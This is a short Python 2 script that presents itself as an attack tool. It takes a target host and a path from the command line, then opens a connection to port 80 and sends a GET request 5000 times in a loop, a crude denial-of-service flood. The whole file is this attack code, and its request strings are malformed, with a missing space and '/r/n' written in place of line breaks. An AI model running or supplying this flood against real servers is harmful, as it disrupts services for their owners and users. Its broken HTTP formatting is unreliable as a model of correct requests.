import socket
import sys
import os

print "[ Attacking " + sys.argv[1] +" ... ]"
print "[ injecting " + sys.argv[2] +" ... ]"

def dosAttack():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 80))
	print">> GET /" + sys.argv[2] + "HTTP/1.1"
	s.send("GET /" + sys.argv[2] + "HTTP/1.1\r\n")
	s.send("HOST: "+ sys.argv[1] + "/r/n/r/n")

for i in range(1,5000):
	dosAttack()